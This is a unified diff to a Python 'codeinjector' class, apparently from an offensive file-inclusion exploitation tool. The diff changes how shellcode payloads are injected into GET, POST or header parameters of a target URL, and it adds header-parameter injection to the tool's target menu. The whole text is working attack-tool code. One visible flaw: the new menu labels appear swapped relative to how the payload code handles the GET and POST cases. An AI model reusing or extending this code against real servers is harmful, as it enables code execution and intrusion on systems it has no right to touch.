@@ -82,7 +82,7 @@ class codeinjector(baseClass):
         if (kernel == ""): kernel = None
         payload = "%s%s%s" %(prefix, shcode, suffix)
         if (ispost == 0):
-            path = fpath.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
+            fpath = fpath.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
         elif (ispost == 1):
             postdata = postdata.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
         elif (ispost == 2):
@@ -93,7 +93,7 @@ class codeinjector(baseClass):
         sys_inject_works = False
         working_shell    = None
 
-        url  = "http://%s%s" %(hostname, path)
+        url  = "http://%s%s" %(hostname, fpath)
 
         code = None
 
@@ -617,17 +617,19 @@ class codeinjector(baseClass):
             file = n.getAttribute("file")
             param = n.getAttribute("param")
             mode = n.getAttribute("mode")
-            ispost = n.getAttribute("ispost")=="1"
+            ispost = int(n.getAttribute("ispost"))
             
             if (mode.find("R") != -1 and settings["dynamic_rfi"]["mode"] not in ("ftp", "local")):
                 doRemoteWarn = True
 
             if (mode.find("x") != -1 or (mode.find("R") != -1 and settings["dynamic_rfi"]["mode"] in ("ftp", "local"))):
                 choose[idx] = n
-                if (ispost==1):
+                if (ispost == 0):
                     textarr.append("[%d] URL: '%s' injecting file: '%s' using POST-param: '%s'" %(idx, path, file, param))
-                else:
+                elif (ispost == 1):
                     textarr.append("[%d] URL: '%s' injecting file: '%s' using GET-param: '%s'" %(idx, path, file, param))
+                elif (ispost == 2):
+                    textarr.append("[%d] URL: '%s' injecting file: '%s' using HEADER-param: '%s'" %(idx, path, file, param))
                 idx = idx +1
 
         if (idx == 1):
